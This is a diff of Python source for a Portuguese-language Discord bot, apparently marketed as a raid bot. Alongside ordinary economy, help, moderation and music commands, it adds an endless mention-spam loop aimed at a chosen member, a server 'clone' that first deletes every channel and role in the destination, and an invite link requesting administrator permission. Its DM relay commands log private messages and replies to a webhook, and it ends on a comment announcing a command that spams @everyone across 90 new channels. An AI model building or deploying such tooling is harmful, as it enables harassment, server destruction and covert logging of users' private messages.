+    save_sonhos()
+    await ctx.send(f"Sonhos de {pessoa.mention} definidos para **{quantidade}** 🌙")
+
+
+class AceitarRelacao(View):
+    def __init__(self, tipo, proponente, sonhada, custo):
+        super().__init__(timeout=120)
+        self.tipo = tipo
+        self.proponente = proponente
+        self.sonhada = sonhada
+        self.custo = custo
+
+    @discord.ui.button(label="Aceitar 💕", style=discord.ButtonStyle.green)
+    async def aceitar(self, interaction: discord.Interaction, button: Button):
+        if interaction.user.id != self.sonhada.id:
+            await interaction.response.send_message(
+                "Só a pessoa pedida pode aceitar/recusar!", ephemeral=True
+            )
+            return
+
+        user_id = self.proponente.id  # quem paga é quem pediu
+        if user_id not in sonhos_db or sonhos_db[user_id] < self.custo:
+            await interaction.response.send_message(
+                f"{self.proponente.mention} não tem sonhos suficientes! Pedido cancelado.",
+                ephemeral=False,
+            )
+            self.stop()
+            return
+
+        sonhos_db[user_id] -= self.custo
+        save_sonhos()
+
+        if self.tipo == "casar":
+            msg = f"**{self.sonhada.mention} aceitou casar com {self.proponente.mention}!** 💍\nGastou {self.custo} sonhos do proponente. Agora ele tem {sonhos_db[user_id]} sonhos."
+        else:
+            msg = f"**{self.sonhada.mention} aceitou namorar com {self.proponente.mention}!** 💞\nGastou {self.custo} sonhos do proponente. Agora ele tem {sonhos_db[user_id]} sonhos."
+
+        await interaction.response.send_message(msg)
+        self.stop()
+
+    @discord.ui.button(label="Recusar 😔", style=discord.ButtonStyle.red)
+    async def recusar(self, interaction: discord.Interaction, button: Button):
+        if interaction.user.id != self.sonhada.id:
+            await interaction.response.send_message(
+                "Só a pessoa pedida pode aceitar/recusar!", ephemeral=True
+            )
+            return
+
+        await interaction.response.send_message(
+            f"**{self.sonhada.mention} recusou o pedido de {self.proponente.mention}.** 💔"
+        )
+        self.stop()
+
+
+@bot.command(name="casar")
+async def casar(ctx, pessoa: discord.Member):
+    user_id = ctx.author.id
+    target_id = pessoa.id
+
+    if user_id == target_id:
+        await ctx.send("Não dá pra casar consigo mesmo kkk")
+        return
+
+    # Verifica se o autor já está casado
+    if user_id in casamentos_db:
+        parceiro = await bot.fetch_user(casamentos_db[user_id])
+        await ctx.send(f"Você já está casado com **{parceiro.name}**!")
+        return
+
+    # Verifica se a pessoa alvo já está casada
+    if target_id in casamentos_db:
+        await ctx.send(
+            f"{pessoa.display_name} já está em um compromisso sério com outra pessoa!"
+        )
+        return
+
+    if user_id not in sonhos_db or sonhos_db[user_id] < 50:
+        await ctx.send("Você precisa de **50 sonhos** pra pedir casamento!")
+        return
+
+    embed = discord.Embed(
+        title="💍 Pedido de Casamento!",
+        description=f"**{ctx.author.mention} quer casar com {pessoa.mention}!**\nCusta 50 sonhos.\n{pessoa.mention}, você aceita?",
+        color=discord.Color.pink(),
+    )
+
+    # Importante: A View precisa ter a lógica de salvar no banco
+    view = AceitarRelacao("casar", ctx.author, pessoa, 50)
+    await ctx.send(embed=embed, view=view)
+
+
+@bot.command(name="namorar")
+async def namorar(ctx, pessoa: discord.Member):
+    user_id = ctx.author.id
+    if user_id == pessoa.id:
+        await ctx.send("Não dá pra namorar consigo mesmo kkk")
+        return
+
+    if user_id not in sonhos_db or sonhos_db[user_id] < 20:
+        await ctx.send("Você precisa de **20 sonhos** pra pedir namoro!")
+        return
+
+    embed = discord.Embed(
+        title="💞 Pedido de Namoro!",
+        description=f"**{ctx.author.mention} quer namorar com {pessoa.mention}!**\nCusta 20 sonhos do proponente (você).\nAceita?",
+        color=discord.Color.red(),
+    )
+    embed.set_thumbnail(url=ctx.author.display_avatar.url)
+
+    view = AceitarRelacao("namorar", ctx.author, pessoa, 20)
+    await ctx.send(embed=embed, view=view)
+    await ctx.send(
+        f"Pedido enviado pra {pessoa.mention}! Aguardando resposta... (só ela pode aceitar/recusar)"
+    )
+
+
+@bot.command(name="divorciar")
+async def divorciar(ctx):
+    user_id = ctx.author.id
+    if user_id not in sonhos_db or sonhos_db[user_id] < 10:
+        await ctx.send("Você precisa de **10 sonhos** pra divorciar!")
+        return
+
+    sonhos_db[user_id] -= 10
+    save_sonhos()
+    await ctx.send(
+        f"**Divórcio aprovado!** Gastou 10 sonhos. Agora tem {sonhos_db[user_id]} sonhos 😔"
+    )
+
+
+@bot.command(name="darsonhos")
+async def dar_sonhos(ctx, pessoa: discord.Member, quantidade: int):
+    user_id = ctx.author.id
+    if user_id not in sonhos_db or sonhos_db[user_id] < quantidade:
+        await ctx.send(f"Você não tem **{quantidade} sonhos** pra dar!")
+        return
+
+    sonhos_db[user_id] -= quantidade
+    sonhos_db[pessoa.id] = sonhos_db.get(pessoa.id, 0) + quantidade
+    save_sonhos()
+
+    await ctx.send(
+        f"**Deu {quantidade} sonhos pra {pessoa.mention}!** 💸\nVocê tem {sonhos_db[user_id]} e {pessoa.name} tem {sonhos_db[pessoa.id]} sonhos."
+    )
+
+
+# INFO COMMANDS
+@bot.command()
+async def botinfo(ctx):
+    embed = discord.Embed(title="⭐ Star Sky Bot", color=discord.Color.blue())
+    embed.add_field(name="Servidores", value=len(bot.guilds))
+    embed.add_field(name="Usuários", value=len(bot.users))
+    embed.add_field(name="Ping", value=f"{round(bot.latency * 1000)}ms")
+    await ctx.send(embed=embed)
+
+
+class HelpView(discord.ui.View):
+    def __init__(self, pages):
+        super().__init__(timeout=60)
+        self.pages = pages
+        self.current_page = 0
+
+    async def update_page(self, interaction: discord.Interaction):
+        embed = self.pages[self.current_page]
+        await interaction.response.edit_message(embed=embed, view=self)
+
+    @discord.ui.button(label="◀️", style=discord.ButtonStyle.gray)
+    async def prev_button(
+        self, interaction: discord.Interaction, button: discord.ui.Button
+    ):
+        if self.current_page > 0:
+            self.current_page -= 1
+            await self.update_page(interaction)
+        else:
+            await interaction.response.send_message(
+                "Você já está na primeira página!", ephemeral=True
+            )
+
+    @discord.ui.button(label="▶️", style=discord.ButtonStyle.gray)
+    async def next_button(
+        self, interaction: discord.Interaction, button: discord.ui.Button
+    ):
+        if self.current_page < len(self.pages) - 1:
+            self.current_page += 1
+            await self.update_page(interaction)
+        else:
+            await interaction.response.send_message(
+                "Você já está na última página!", ephemeral=True
+            )
+
+
+import discord
+from discord.ext import commands
+from discord.ui import View, Button
+
+
+@bot.command(name="help")
+async def help_cmd(ctx, *, comando_especifico: str = None):
+    """
+    Mostra todos os comandos disponíveis ou detalhes de um específico.
+    """
+    prefix = ctx.prefix
+
+    # Se o usuário pediu ajuda de um comando específico (!help ban)
+    if comando_especifico:
+        cmd = bot.get_command(comando_especifico.lower())
+        if cmd and not cmd.hidden:
+            uso = f"{prefix}{cmd.name} {cmd.signature}".strip()
+            desc = cmd.help or "Sem descrição disponível."
+            embed_unico = discord.Embed(
+                title=f"📖 Detalhes do Comando: {cmd.name}",
+                description=f"**Uso:** `{uso}`\n**Descrição:** {desc}",
+                color=discord.Color.green(),
+            )
+            embed_unico.set_footer(text=f"Solicitado por {ctx.author.name}")
+            return await ctx.send(embed=embed_unico)
+        else:
+            return await ctx.send(f"❌ Comando `{comando_especifico}` não encontrado.")
+
+    # --- Lógica para listar TODOS os comandos ---
+
+    # bot.commands é um SET, então iteramos diretamente
+    comandos_data = []
+    for cmd in bot.commands:
+        if not cmd.hidden:
+            desc = (cmd.help or "").split("\n")[0]  # Pega só a primeira linha
+            uso = f"{prefix}{cmd.name} {cmd.signature}".strip()
+            comandos_data.append((cmd.name, uso, desc))
+
+    # Ordena alfabeticamente pelo nome
+    comandos_data.sort(key=lambda x: x[0])
+
+    # Configuração de páginas
+    per_page = 8
+    pages = [
+        comandos_data[i : i + per_page] for i in range(0, len(comandos_data), per_page)
+    ]
+
+    class HelpView(View):
+        def __init__(self, pages, prefix):
+            super().__init__(timeout=300)
+            self.pages = pages
+            self.prefix = prefix
+            self.current_page = 0
+
+        def create_embed(self):
+            page_content = self.pages[self.current_page]
+            embed = discord.Embed(
+                title="⭐ Star Sky Bot - Lista de Comandos",
+                description=f"Prefixo: `{self.prefix}`\nTotal de comandos: **{len(comandos_data)}**\nPágina: **{self.current_page + 1}/{len(self.pages)}**",
+                color=discord.Color.blue(),
+            )
+            embed.set_thumbnail(url=bot.user.display_avatar.url)
+
+            for nome, uso, desc in page_content:
+                embed.add_field(name=f"`{uso}`", value=desc, inline=False)
+
+            embed.set_footer(text="Made By CabralDev 💤 | Bom Dia")
+            return embed
+
+        @discord.ui.button(label="← Anterior", style=discord.ButtonStyle.grey)
+        async def prev(
+            self, interaction: discord.Interaction, button: discord.ui.Button
+        ):
+            if self.current_page > 0:
+                self.current_page -= 1
+                await interaction.response.edit_message(
+                    embed=self.create_embed(), view=self
+                )
+            else:
+                await interaction.response.send_message(
+                    "Você já está na primeira página!", ephemeral=True
+                )
+
+        @discord.ui.button(label="Próximo →", style=discord.ButtonStyle.grey)
+        async def next(
+            self, interaction: discord.Interaction, button: discord.ui.Button
+        ):
+            if self.current_page < len(self.pages) - 1:
+                self.current_page += 1
+                await interaction.response.edit_message(
+                    embed=self.create_embed(), view=self
+                )
+            else:
+                await interaction.response.send_message(
+                    "Você já está na última página!", ephemeral=True
+                )
+
+    # Envia a mensagem inicial
+    view = HelpView(pages, prefix)
+    await ctx.send(embed=view.create_embed(), view=view)
+
+
+@bot.command()
+async def uptime(ctx):
+    uptime_seconds = int(time.time() - start_time)
+    hours = uptime_seconds // 3600
+    minutes = (uptime_seconds % 3600) // 60
+    await ctx.send(f"⏱ Uptime: {hours}h {minutes}m")
+
+
+# Variável global pra controlar o spam (pra !stop parar)
+spam_tasks = {}  # dicionário: canal_id -> task do spam
+
+
+@bot.command(name="marcar")
+@commands.has_permissions(
+    manage_messages=True
+)  # só quem tem permissão de gerenciar mensagens usa
+async def marca(ctx, member: discord.Member):
+    if ctx.author.id not in OWNER_IDS:
+        await ctx.send(":x: Só o dono do bot pode usar isso.")
+        return
+
+    channel_id = ctx.channel.id
+
+    if channel_id in spam_tasks:
+        await ctx.send("Já tem um spam rodando nesse canal! Use !stop pra parar.")
+        return
+
+    await ctx.send(f"Spammando menção em {member.mention}... Use !stop pra parar.")
+
+    async def spam_loop():
+        while True:
+            try:
+                await ctx.channel.send(f"{member.mention}")
+                await asyncio.sleep(
+                    1.0
+                )  # 1 segundo entre menções (ajuste se quiser mais rápido)
+            except discord.HTTPException as e:
+                if "rate limit" in str(e).lower():
+                    await asyncio.sleep(5.0)  # espera mais se bater rate limit
+                else:
+                    break  # para se der outro erro (ex: canal deletado)
+
+    task = bot.loop.create_task(spam_loop())
+    spam_tasks[channel_id] = task
+
+
+@bot.command(name="stop")
+@commands.has_permissions(manage_messages=True)
+async def stop_spam(ctx):
+    channel_id = ctx.channel.id
+
+    if channel_id in spam_tasks:
+        spam_tasks[channel_id].cancel()
+        del spam_tasks[channel_id]
+        await ctx.send("Spam parado! 🚫")
+    else:
+        await ctx.send("Não tem spam rodando nesse canal.")
+
+
+@bot.command()
+async def avatar(ctx, member: discord.Member = None):
+    member = member or ctx.author
+    embed = discord.Embed(title=f"Avatar de {member}", color=discord.Color.blue())
+    embed.set_image(url=member.display_avatar.url)
+    await ctx.send(embed=embed)
+
+
+@bot.command(name="ban")
+@commands.is_owner()
+async def ban(ctx, member: discord.Member, *, motivo=None):
+    if member == ctx.author:
+        await ctx.send("Você não pode se banir kkk")
+        return
+    try:
+        await member.ban(reason=motivo or "Banido pelo Star Sky Bot")
+        await ctx.send(f"{member.mention} foi banido! Motivo: {motivo or 'Sem motivo'}")
+    except discord.Forbidden:
+        await ctx.send("Não tenho permissão pra banir essa pessoa")
+    except discord.HTTPException as e:
+        await ctx.send(f"Erro ao banir: {e}")
+
+
+@bot.command(name="kick")
+@commands.is_owner()
+async def kick(ctx, member: discord.Member, *, motivo=None):
+    if member == ctx.author:
+        await ctx.send("Você não pode se kickar kkk")
+        return
+    try:
+        await member.kick(reason=motivo or "Kickado pelo Star Sky Bot")
+        await ctx.send(
+            f"{member.mention} foi kickado! Motivo: {motivo or 'Sem motivo'}"
+        )
+    except discord.Forbidden:
+        await ctx.send("Não tenho permissão pra kickar essa pessoa")
+    except discord.HTTPException as e:
+        await ctx.send(f"Erro ao kickar: {e}")
+
+
+@bot.command(name="mute")
+@commands.is_owner()
+async def mute(ctx, member: discord.Member, tempo: int = 60, *, motivo=None):
+    if member == ctx.author:
+        await ctx.send("Você não pode se mutar kkk")
+        return
+    if tempo < 1 or tempo > 1440:
+        await ctx.send("Tempo inválido! Use entre 1 e 1440 minutos.")
+        return
+
+    muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
+    if muted_role is None:
+        muted_role = await ctx.guild.create_role(name="Muted")
+        for channel in ctx.guild.channels:
+            await channel.set_permissions(
+                muted_role, send_messages=False, speak=False, add_reactions=False
+            )
+        await ctx.send("Cargo 'Muted' criado automaticamente.")
+
+    try:
+        await member.add_roles(muted_role, reason=motivo or "Mutado pelo Star Sky Bot")
+        await ctx.send(
+            f"{member.mention} mutado por {tempo} minutos! Motivo: {motivo or 'Sem motivo'}"
+        )
+        await asyncio.sleep(tempo * 60)
+        await member.remove_roles(muted_role)
+        await ctx.send(f"{member.mention} foi desmutado automaticamente.")
+    except discord.Forbidden:
+        await ctx.send("Não tenho permissão pra mutar essa pessoa")
+    except discord.HTTPException as e:
+        await ctx.send(f"Erro ao mutar: {e}")
+
+
+@bot.command(name="clear")
+@commands.is_owner()
+async def clear(ctx, quantidade: int = 50):
+    if quantidade < 1 or quantidade > 100:
+        await ctx.send("Quantidade inválida! Use entre 1 e 100.")
+        return
+    try:
+        deleted = await ctx.channel.purge(limit=quantidade)
+        await ctx.send(f"🗑️ Apaguei {len(deleted)} mensagens.", delete_after=5)
+    except discord.Forbidden:
+        await ctx.send("Não tenho permissão pra deletar mensagens aqui")
+    except discord.HTTPException as e:
+        await ctx.send(f"Erro ao deletar: {e}")
+
+
+# DM PRIVADA COM RETRANSMISSÃO + LOG NO WEBHOOK
+dm_conversations = {}  # canal_id -> member_id
+
+
+@bot.command(name="dm")
+@commands.check(lambda ctx: ctx.author.id in [1046795045946281984, 1477454661857579018])
+async def dm(ctx, member: discord.Member, *, mensagem):
+    try:
+        await member.send(mensagem)
+        await ctx.send(f"✅ Mensagem enviada pra {member.mention}: `{mensagem}`")
+
+        # Salva conversa ativa
+        dm_conversations[ctx.channel.id] = member.id
+
+        await ctx.send(
+            f"Respostas de {member.mention} na DM do bot vão aparecer aqui. Use !dmstop pra parar."
+        )
+
+        # Log no webhook
+        log_msg = f"""
+DM enviada:
+De: {ctx.author.name} (ID: {ctx.author.id})
+Para: {member.name} (ID: {member.id})
+Mensagem: {mensagem}
+Horário: {datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")}
+Made By: C̷a̷b̷r̷a̷l̷D̷e̷v̷💤
+        """.strip()
+
+        async with aiohttp.ClientSession() as session:
+            webhook = discord.Webhook.from_url(
+                os.getenv("WEBHOOK_URL"), session=session
+            )
+            await webhook.send(log_msg)
+
+    except discord.Forbidden:
+        await ctx.send(f"Não consegui mandar DM pra {member.mention} (DM fechadas)")
+    except discord.HTTPException as e:
+        await ctx.send(f"Erro ao enviar DM: {e}")
+
+
+@bot.command(name="dm_id")
+@commands.check(lambda ctx: ctx.author.id in [1046795045946281984, 1477454661857579018])
+async def dm_id(ctx, user_id: int, *, mensagem):
+    try:
+        pessoa = await bot.fetch_user(user_id)
+        await pessoa.send(mensagem)
+        await ctx.send(
+            f"✅ Mensagem enviada na DM de {pessoa.name} (ID: {user_id}): `{mensagem}`"
+        )
+
+        dm_conversations[ctx.channel.id] = pessoa.id
+
+        await ctx.send(
+            f"Respostas de {pessoa.name} na DM do bot vão aparecer aqui. Use !dmstop pra parar."
+        )
+
+        # Log no webhook
+        log_msg = f"""
+DM enviada pelo ID:
+De: {ctx.author.name} (ID: {ctx.author.id})
+Para: {pessoa.name} (ID: {user_id})
+Mensagem: {mensagem}
+Horário: {datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")}
+Made By: C̷a̷b̷r̷a̷l̷D̷e̷v̷💤
+        """.strip()
+
+        async with aiohttp.ClientSession() as session:
+            webhook = discord.Webhook.from_url(
+                os.getenv("WEBHOOK_URL"), session=session
+            )
+            await webhook.send(log_msg)
+
+    except discord.NotFound:
+        await ctx.send(f"Usuário ID {user_id} não encontrado.")
+    except discord.Forbidden:
+        await ctx.send(f"Não consegui mandar DM pro ID {user_id} (DM fechadas)")
+    except discord.HTTPException as e:
+        await ctx.send(f"Erro ao enviar DM: {e}")
+
+
+@bot.event
+async def on_message(message):
+    if message.author.bot:
+        return
+
+    # Respostas na DM do bot
+    if message.guild is None:
+        for channel_id, target_id in list(dm_conversations.items()):
+            if target_id == message.author.id:
+                channel = bot.get_channel(channel_id)
+                if channel:
+                    await channel.send(
+                        f"**{message.author.name} respondeu na DM:** {message.content}"
+                    )
+
+                    # Log da resposta no webhook
+                    log_msg = f"""
+Resposta na DM:
+De: {message.author.name} (ID: {message.author.id})
+Mensagem: {message.content}
+Horário: {datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")}
+Made By: C̷a̷b̷r̷a̷l̷D̷e̷v̷💤
+                    """.strip()
+
+                    async with aiohttp.ClientSession() as session:
+                        webhook = discord.Webhook.from_url(
+                            os.getenv("WEBHOOK_URL"), session=session
+                        )
+                        await webhook.send(log_msg)
+                break
+
+    await bot.process_commands(message)
+
+
+@bot.command(name="dmstop")
+@commands.check(lambda ctx: ctx.author.id in [1046795045946281984, 1477454661857579018])
+async def dmstop(ctx):
+    channel_id = ctx.channel.id
+    if channel_id in dm_conversations:
+        member_id = dm_conversations.pop(channel_id)
+        member = await bot.fetch_user(member_id)
+        await ctx.send(f"Conversa privada com {member.name} parada.")
+    else:
+        await ctx.send("Não tem conversa DM ativa nesse canal.")
+
+
+@bot.command(name="nick")
+@commands.is_owner()
+async def nick(ctx, member: discord.Member, *, novo_nick=None):
+    try:
+        await member.edit(nick=novo_nick)
+        await ctx.send(
+            f"Nick de {member.mention} alterado para **{novo_nick or 'padrão'}**"
+        )
+    except discord.Forbidden:
+        await ctx.send("Não tenho permissão pra mudar o nick dessa pessoa")
+    except discord.HTTPException as e:
+        await ctx.send(f"Erro ao mudar nick: {e}")
+
+
+@bot.command(name="roleall")
+@commands.is_owner()
+async def roleall(ctx, role: discord.Role):
+    membros = ctx.guild.members
+    sucesso = 0
+    falha = 0
+
+    await ctx.send(
+        f"Adicionando cargo {role.mention} pra {len(membros)} membros... Pode demorar."
+    )
+
+    for member in membros:
+        try:
+            await member.add_roles(role)
+            sucesso += 1
+        except:
+            falha += 1
+
+    await ctx.send(f"✅ Feito! Sucesso: {sucesso} | Falha: {falha}")
+
+
+@bot.command(name="nickall")
+@commands.is_owner()
+async def nickall(ctx, *, novo_nick=None):
+    membros = ctx.guild.members
+    sucesso = 0
+    falha = 0
+
+    await ctx.send(
+        f"Mudando nick de {len(membros)} membros para '{novo_nick or 'padrão'}'... Pode demorar."
+    )
+
+    for member in membros:
+        try:
+            await member.edit(nick=novo_nick)
+            sucesso += 1
+        except:
+            falha += 1
+
+    await ctx.send(f"✅ Feito! Sucesso: {sucesso} | Falha: {falha}")
+
+
+@bot.command(name="clone")
+@commands.is_owner()
+async def clone_server(ctx):
+    await ctx.send(
+        "**Clonando server...** Digite o ID do servidor destino em 30 segundos."
+    )
+
+    def check(m):
+        return m.author == ctx.author and m.channel == ctx.channel
+
+    try:
+        msg = await bot.wait_for("message", check=check, timeout=30.0)
+        try:
+            destino_id = int(msg.content.strip())
+        except ValueError:
+            await ctx.send("ID inválido. Tem que ser um número.")
+            return
+
+        destino = bot.get_guild(destino_id)
+        if not destino:
+            await ctx.send(
+                "Não encontrei o servidor destino. O bot precisa estar nesse servidor."
+            )
+            return
+
+        origem = ctx.guild
+
+        await ctx.send(
+            f"Iniciando clone: {origem.name} → {destino.name}\n**AVISO: isso vai DELETAR tudo no destino primeiro!**\nDigite 'confirm' em 15s pra prosseguir."
+        )
+
+        def confirm_check(m):
+            return (
+                m.author == ctx.author
+                and m.channel == ctx.channel
+                and m.content.lower() == "confirm"
+            )
+
+        try:
+            await bot.wait_for("message", check=confirm_check, timeout=15.0)
+        except asyncio.TimeoutError:
+            await ctx.send("Cancelado.")
+            return
+
+        # Etapa 1: Deletar tudo no destino (com delay pra evitar rate limit)
+        await ctx.send("Deletando canais, categorias e cargos no destino...")
+        for channel in destino.channels:
+            try:
+                await channel.delete()
+                await asyncio.sleep(0.6)
+            except:
+                pass
+
+        for category in destino.categories:
+            try:
+                await category.delete()
+                await asyncio.sleep(0.6)
+            except:
+                pass
+
+        for role in destino.roles:
+            if role != destino.default_role and role != destino.me.top_role:
+                try:
+                    await role.delete()
+                    await asyncio.sleep(0.6)
+                except:
+                    pass
+
+        # Etapa 2: Copiar nome e ícone do servidor
+        try:
+            icon_bytes = await origem.icon.read() if origem.icon else None
+            await destino.edit(name=origem.name, icon=icon_bytes)
+            await ctx.send("Nome e ícone do servidor clonados.")
+        except:
+            await ctx.send(
+                "Não consegui clonar nome/ícone (falta permissão ou rate limit)."
+            )
+
+        # Etapa 3: Clonar cargos (sem tentar copiar permissions totais pra evitar erro de hierarquia)
+        await ctx.send("Clonando cargos...")
+        for role in origem.roles:
+            if role == origem.default_role:
+                continue
+            try:
+                await destino.create_role(
+                    name=role.name,
+                    color=role.color,
+                    hoist=role.hoist,
+                    mentionable=role.mentionable,
+                    reason="Clone do Star Sky Bot",
+                )
+                await asyncio.sleep(0.7)
+            except:
+                pass
+
+        # Etapa 4: Clonar categorias
+        await ctx.send("Clonando categorias...")
+        category_map = {}  # origem → destino
+        for cat in origem.categories:
+            try:
+                new_cat = await destino.create_category(
+                    name=cat.name, position=cat.position, reason="Clone do Star Sky Bot"
+                )
+                category_map[cat.id] = new_cat
+                await asyncio.sleep(0.7)
+            except:
+                pass
+
+        # Etapa 5: Clonar canais de texto
+        await ctx.send("Clonando canais de texto...")
+        for channel in origem.text_channels:
+            try:
+                cat_destino = category_map.get(channel.category_id)
+                await destino.create_text_channel(
+                    name=channel.name,
+                    topic=channel.topic,
+                    position=channel.position,
+                    slowmode_delay=channel.slowmode_delay,
+                    nsfw=channel.nsfw,
+                    category=cat_destino,
+                    reason="Clone do Star Sky Bot",
+                )
+                await asyncio.sleep(0.8)
+            except:
+                pass
+
+        # Etapa 6: Clonar canais de voz
+        await ctx.send("Clonando canais de voz...")
+        for channel in origem.voice_channels:
+            try:
+                cat_destino = category_map.get(channel.category_id)
+                await destino.create_voice_channel(
+                    name=channel.name,
+                    position=channel.position,
+                    bitrate=channel.bitrate,
+                    user_limit=channel.user_limit,
+                    category=cat_destino,
+                    reason="Clone do Star Sky Bot",
+                )
+                await asyncio.sleep(0.8)
+            except:
+                pass
+
+        await ctx.send(
+            "Clone finalizado! (ou o máximo que foi possível). Verifique o servidor destino."
+        )
+
+    except asyncio.TimeoutError:
+        await ctx.send("Tempo esgotado. Comando cancelado.")
+    except ValueError:
+        await ctx.send("ID inválido. Tem que ser um número.")
+    except discord.Forbidden:
+        await ctx.send("Falta permissão no servidor destino. Dê cargo alto pro bot lá.")
+    except discord.HTTPException as e:
+        await ctx.send(f"Erro geral durante o clone: {e}")
+
+
+@bot.command()
+async def serverinfo(ctx):
+    guild = ctx.guild
+    embed = discord.Embed(title=guild.name, color=discord.Color.blue())
+    embed.add_field(name="ID", value=guild.id)
+    embed.add_field(name="Membros", value=guild.member_count)
+    embed.add_field(name="Canais", value=len(guild.channels))
+    await ctx.send(embed=embed)
+
+
+@bot.command()
+async def restart(ctx):
+    if ctx.author.id == 1046795045946281984:
+        await ctx.send("🔄 Encerrando processo... Clique em 'Run' se eu não voltar!")
+        await bot.close()  # Fecha a conexão com o Discord de forma limpa
+    else:
+        await ctx.send("❌ Sem permissão.")
+
+
+@bot.command(name="invite")
+async def invite(ctx):
+    # Link de invite do bot (com permissões 8 = admin, muda se quiser menos)
+    invite_link = f"https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot"
+
+    # Embed bonito
+    embed = discord.Embed(
+        title="⭐ Convide o Star Sky Bot!",
+        description="Clique no botão abaixo para adicionar o Bot ao seu server.\n\n**Permissões:** Administrador.",
+        color=discord.Color.blue(),
+    )
+    embed.set_thumbnail(url=bot.user.display_avatar.url)
+    embed.set_footer(text="Made By: C̷a̷b̷r̷a̷l̷D̷e̷v̷💤")
+
+    # Botão clicável
+    view = discord.ui.View()
+    button = discord.ui.Button(
+        label="Adicionar Bot🚀", style=discord.ButtonStyle.green, url=invite_link
+    )
+    view.add_item(button)
+
+    await ctx.send(embed=embed, view=view)
+
+
+@bot.command(name="join")
+@commands.is_owner()
+async def join(ctx):
+    if ctx.author.voice is None:
+        return await ctx.send("Você precisa estar em uma call de voz pra usar !join!")
+    channel = ctx.author.voice.channel
+    try:
+        player: DebugPlayer = ctx.voice_client
+        if player is None:
+            player = await channel.connect(cls=DebugPlayer, timeout=60.0)
+        else:
+            await player.move_to(channel)
+        await ctx.send(f"Entrei na call **{channel.name}**!")
+    except Exception as e:
+        await ctx.send(f"Erro ao entrar: {e}")
+
+
+@bot.command(name="spotify")
+@commands.is_owner()
+async def spotify(ctx, *, query: str):
+    if not ctx.author.voice:
+        return await ctx.send("Você precisa estar em um canal de voz!")
+
+    channel = ctx.author.voice.channel
+
+    try:
+        node = wavelink.Pool.get_node()
+    except Exception:
+        node = None
+
+    if node is None:
+        return await ctx.send(
+            "❌ Servidor de música offline. Tente novamente em instantes."
+        )
+
+    player: DebugPlayer = ctx.voice_client
+    try:
+        if player is None:
+            player = await channel.connect(cls=DebugPlayer, timeout=60.0)
+        elif player.channel != channel:
+            await player.move_to(channel)
+    except wavelink.ChannelTimeoutException as e:
+        print(
+            f"[DEBUG] Timeout. Node session_id={wavelink.Pool.get_node().session_id!r}"
+        )
+        return await ctx.send(f"❌ Erro ao entrar na call: {e}")
+    except Exception as e:
+        import traceback
+
+        traceback.print_exc()
+        return await ctx.send(f"❌ Erro ao entrar na call: {type(e).__name__}: {e}")
+
+    await ctx.send(f"🔍 Buscando: **{query}**...")
+
+    try:
+        tracks = await wavelink.Playable.search(query)
+        if not tracks:
+            return await ctx.send("❌ Nenhuma música encontrada!")
+
+        track = tracks[0]
+
+        if player.playing:
+            await player.stop()
+
+        await player.play(track)
+        await ctx.send(f"🎵 Tocando agora: **{track.title}** — {track.author}")
+
+    except Exception as e:
+        import traceback
+
+        traceback.print_exc()
+        await ctx.send(f"❌ Erro ao tocar: {e}")
+
+
+@bot.command(name="parar")
+@commands.is_owner()
+async def stop_music(ctx):
+    player: wavelink.Player = ctx.voice_client
+    if player and player.playing:
+        await player.stop()
+        await ctx.send("⏹ Música parada.")
+    else:
+        await ctx.send("Não estou tocando nada.")
+
+
+@bot.command(name="leave")
+@commands.is_owner()
+async def leave(ctx):
+    player: wavelink.Player = ctx.voice_client
+    if player:
+        await player.disconnect()
+        await ctx.send("👋 Saí da call.")
+    else:
+        await ctx.send("Não estou em nenhuma call.")
+
+
+@bot.command(name="say")
+@commands.has_permissions(
+    manage_messages=True
+)  # só quem tem permissão de gerenciar mensagens usa (pra evitar spam)
+async def say(ctx, *, message: str):
+    if not message:
+        await ctx.send("Escreva o que eu devo falar! Ex: !say Olá mundo")
+        return
+
+    try:
+        # Deleta a mensagem do comando pra ficar limpo (opcional)
+        await ctx.message.delete()
+    except:
+        pass  # se não tiver permissão pra deletar, ignora
+
+    await ctx.send(message)
+
+
+@bot.command()
+@is_tester()
+async def panel(ctx):
+    embed = discord.Embed(
+        title="⭐ Star Sky Panel",
+        description="Painel de controle",
+        color=discord.Color.purple(),
+    )
+    await ctx.send(embed=embed)
+
+
+status_list = [
+    "Star Sky Online ⚫",
+    "Use !Help",
+    "I am currently on {server_count} servers!",
+    "Best Raid Bot of 2026",
+]
+
+
+@tasks.loop(seconds=6)
+async def change_status():
+    await bot.wait_until_ready()
+
+    for status in status_list:
+        server_count = len(bot.guilds)
+
+        current_status = status.format(server_count=server_count)
+
+        await bot.change_presence(activity=discord.Game(name=current_status))
+
+        await asyncio.sleep(6)
+
+
+@bot.event
+async def on_ready():
+    print(f"Bot logado como {bot.user.name}")
+    if not change_status.is_running():
+        change_status.start()
+
+
+@bot.event
+async def on_wavelink_node_ready(payload: wavelink.NodeReadyEventPayload):
+    print(
+        f"[LAVALINK] Node pronto: {payload.node.uri} | session={payload.node.session_id!r} | resumed={payload.resumed}"
+    )
+
+
+@bot.event
+async def on_wavelink_inactive_player(player: wavelink.Player):
+    print(f"[LAVALINK] Player inativo no servidor {player.guild.id}, desconectando.")
+    await player.disconnect()
+
+
+# CREDITS
+@bot.command()
+async def by(ctx):
+    await ctx.send("Made By: C̷a̷b̷r̷a̷l̷D̷e̷v̷💤")
+
+
+# MUDAR AVATAR DO BOT
+@bot.command(name="mudaravatar")
+@commands.is_owner()
+async def mudar_avatar(ctx):
+    if not AVATARES:
+        await ctx.send("Não tem avatar na lista! Adicione links em AVATARES.")
+        return
+
+    url = random.choice(AVATARES)
+    async with aiohttp.ClientSession() as session:
+        async with session.get(url) as resp:
+            if resp.status != 200:
+                await ctx.send(f"Erro ao baixar imagem: status {resp.status}")
+                return
+            imagem = await resp.read()
+
+    try:
+        await bot.user.edit(avatar=imagem)
+        await ctx.send(f"Avatar do bot trocado! Novo: {url}")
+    except discord.HTTPException as e:
+        await ctx.send(f"Erro ao trocar avatar: {e} (rate limit ou limite do Discord)")
+
+
+# MUDAR BANNER DO BOT (não existe, só pra mostrar)
+@bot.command(name="mudarbanner")
+@commands.is_owner()
+async def mudar_banner(ctx):
+    await ctx.send(
+        "Bots não têm banner próprio no Discord! Só usuários normais e servidores têm banner. Posso trocar só o avatar."
+    )
+
+
+# RAID - Cria 90 canais e spamma @everyone em loop infinito em cada um
